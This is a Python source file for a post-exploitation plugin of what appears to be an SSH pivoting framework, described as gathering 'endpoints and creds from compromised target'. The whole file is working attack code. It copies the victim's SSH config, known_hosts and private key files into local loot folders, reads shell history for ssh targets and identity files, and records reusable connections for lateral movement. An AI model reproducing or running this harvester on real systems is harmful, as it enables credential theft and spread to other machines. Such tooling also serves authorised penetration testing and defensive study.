import getpass
import os
import re
import glob
import ipaddress
import json
import subprocess
import asyncio, asyncssh
from src.endpoint import Endpoint
from src.user import User
from src.path import Path
from src.creds import Creds
from src.connection import Connection

class ExtStr(type):
    def __str__(self):
        return self.getKey()

class BaboosshExt(object,metaclass=ExtStr):

    def __init__(self,socket,connection,wspaceFolder):
        self.socket = socket
        self.connection = connection
        self.wspaceFolder = wspaceFolder

    @classmethod
    def getModType(cls):
        return "payload"

    @classmethod
    def getKey(cls):
        return "gather"

    @classmethod
    def descr(cls):
        return "Gather endpoints and creds from compromised target"
    
    @classmethod
    async def run(cls,socket, connection, wspaceFolder):
        g = cls(socket,connection, wspaceFolder)
        try:
            await g.gather()
        except Exception as e:
            print("Error : "+str(e))
            return False
        return True
    
    async def gather(self):
        await self.gatherFromConfig()
        historyFiles = await self.listHistoryFiles()
        for historyFile in historyFiles:
            await self.gatherFromHistory(historyFile)
        await self.gatherKeys()
        await self.gatherFromKnown()

    async def hostnameToIP(self,hostname,port=None):
        endpoints = []
        #Check if hostname is IP or Hostname :
        try:
            ipobj = ipaddress.ip_address(hostname)
        except ValueError:
            res = await self.socket.run("getent hosts "+hostname+" | awk '{ print $1 }'")
            ips = res.stdout.splitlines()
            for ip in ips:
                ipobj = ipaddress.ip_address(ip)
                if ipobj.is_loopback:
                    continue
                endpoint = Endpoint(ip,port if port is not None else 22)
                try:
                    path = Path(self.connection.getEndpoint(),endpoint)
                except ValueError:
                    pass
                else:
                    endpoint.save()
                    path.save()
                    endpoints.append(endpoint)
        else:
            if ipobj.is_loopback:
                return []
            endpoint = Endpoint(hostname,port if port is not None else 22)
            try:
                path = Path(self.connection.getEndpoint(),endpoint)
            except ValueError:
                pass
            else:
                endpoint.save()
                path.save()
                endpoints.append(endpoint)
        return endpoints

    async def gatherFromConfig(self):
        lootFolder = os.path.join(self.wspaceFolder,"loot")
        filename = str(self.connection.getEndpoint()).replace(":","-")+"_"+str(self.connection.getUser())+"_.ssh_config"
        filepath = os.path.join(lootFolder,filename)
        try:
            await asyncssh.scp((self.socket,".ssh/config"),filepath)
        except Exception as e:
            return None
        with open(filepath,'r',errors='replace') as f:
            data = f.read()
        lines = data.split('\n')
        nbEndpoints = 0
        nbUsers = 0
        nbCreds = 0
        curHost = None
        for line in lines:
            if line == '':
                continue
            if line[:5].lower() == "Host ".lower():
                if curHost != None:
                    if "host" in curHost.keys():
                        host = curHost["host"]
                    else:
                        host = curHost["name"]
                    if "port" in curHost.keys():
                        port = curHost["port"]
                    else:
                        port=None
                    endpoints = await self.hostnameToIP(host,port)
                    nbEndpoints = nbEndpoints + len(endpoints)
                    user = None
                    identity = None
                    if "user" in curHost.keys():
                        user = User(curHost["user"])
                        user.save()
                        nbUsers = nbUsers + 1
                    if "identity" in curHost.keys():
                        identity = await self.getKeyToCreds(curHost["identity"],".")
                        if identity != None:
                            nbCreds = nbCreds+1
                    if user is not None and identity is not None:
                        for endpoint in endpoints:
                            conn = Connection(endpoint,user,identity)
                            conn.save()
                curHost = {}
                curHost["name"] = line.split()[1]
            else:
                [key,val] = line.strip().split(' ',1)
                key = key.lower()
                if key == "user":
                    curHost['user'] = val
                elif key == "port":
                    curHost['port'] = val
                elif key == "hostname":
                    curHost['host'] = val
                elif key == "identityfile":
                    curHost['identity'] = val
        if curHost != None:
            if "host" in curHost.keys():
                host = curHost["host"]
            else:
                host = curHost["name"]
            if "port" in curHost.keys():
                port = curHost["port"]
            else:
                port=None
            endpoints = await self.hostnameToIP(host,port)
            nbEndpoints = nbEndpoints + len(endpoints)
            user = None
            identity = None
            if "user" in curHost.keys():
                user = User(curHost["user"])
                user.save()
                nbUsers = nbUsers + 1
            if "identity" in curHost.keys():
                identity = await self.getKeyToCreds(curHost["identity"],".")
                if identity != None:
                    nbCreds = nbCreds+1
            if user is not None and identity is not None:
                for endpoint in endpoints:
                    conn = Connection(endpoint,user,identity)
                    conn.save()
        print("Found "+str(nbEndpoints)+" enpoints, "+str(nbUsers)+" users and "+str(nbCreds)+" creds in config file")

    async def gatherFromKnown(self):
        lootFolder = os.path.join(self.wspaceFolder,"loot")
        filename = str(self.connection.getEndpoint()).replace(':','-')+"_"+str(self.connection.getUser())+"_.ssh_known_hosts"
        filepath = os.path.join(lootFolder,filename)
        try:
            await asyncssh.scp((self.socket,".ssh/known_hosts"),filepath)
        except Exception as e:
            return None
        with open(filepath,'r',errors='replace') as f:
            data = f.read()
        lines = data.split('\n')
        endpoints = []
        for line in lines:
            if "|" in line:
                #The entry is hashed, and should be ignored
                continue
            targets = line.partition(' ')[0]
            for target in targets.split(','):
                endpoints = endpoints + await self.hostnameToIP(target)
        print("Found "+str(len(endpoints))+" hosts in known_hosts")

    async def gatherKeys(self):
        files = []
        ret = []
        result = await self.socket.run("ls -A .ssh")
        for line in result.stdout.splitlines():
            if "rsa" in line or "key" in line or "p12" in line or "dsa" in line:
                files.append(line)
        for keyfile in files:
            c = await self.getKeyToCreds(keyfile)
            if c != None:
                ret.append(c)
        print("Found "+str(len(ret))+" private keys")

    async def getKeyToCreds(self,keyfile,basePath=".ssh"):
        if basePath != ".":
            keyfile = os.path.join(basePath,keyfile)
        from src.params import Extensions
        keysFolder = os.path.join(self.wspaceFolder,"keys")
        filename = str(self.connection.getEndpoint()).replace(":","-")+"_"+str(self.connection.getUser())+"_"+keyfile.replace("/","_")
        filepath = os.path.join(keysFolder,filename)
        try:
            await asyncssh.scp((self.socket,keyfile),filepath)
        except Exception as e:
            print(e)
            return None
        subprocess.run(["chmod","600",filepath])
        valid,haspass = Extensions.getAuthMethod("privkey").checkKeyfile(filepath)
        if valid:
            c= { "passphrase":"","keypath":filepath,"haspass":haspass}
            cred = Creds("privkey",json.dumps(c))
            cred.save()
            return cred
        else:
            os.remove(filepath)
        return None

    async def listHistoryFiles(self):
        ret = []
        result = await self.socket.run("ls -A")
        for line in result.stdout.splitlines():
            if "history" in line:
                ret.append(line)
        return ret

    async def gatherFromHistory(self,historyFile):
        result = await self.socket.run("cat "+historyFile)
        lines = result.stdout.splitlines()
        nbEndpoints = 0
        nbUsers = 0
        nbCreds = 0
        for line in lines:
            if re.search(r'^ *ssh ',line):
                option = ""
                words = line.split()
                host = False
                port = None
                user = None
                identity = None

                for i in range(1,len(words)):
                    if option != "":
                        if option == "identity":
                            identity = words[i]
                        elif option == "port":
                            port = words[i]
                        option = ""
                    elif words[i][0] == "-":
                        if words[i] == "-i":
                            option = "identity"
                        elif words[i] == "-p":
                            option = "port"
                        else:
                            option = words[i]
                    elif not host:
                        if '@' in words[i]:
                            user,hostname = words[i].split("@",1)
                        else:
                            hostname = words[i]
                        host = True
                if not host:
                    continue
                endpoints = await self.hostnameToIP(hostname,port)
                nbEndpoints = nbEndpoints + len(endpoints)
                if user is not None:
                    user = User(user)
                    user.save()
                    nbUsers = nbUsers + 1
                if identity is not None:
                    identity = await self.getKeyToCreds(identity,".")
                    if identity != None:
                        nbCreds = nbCreds+1
                if user is not None and identity is not None:
                    for endpoint in endpoints:
                        conn = Connection(endpoint,user,identity)
                        conn.save()

        print("Found "+str(nbEndpoints)+" enpoints, "+str(nbUsers)+" users and "+str(nbCreds)+" creds in "+historyFile)


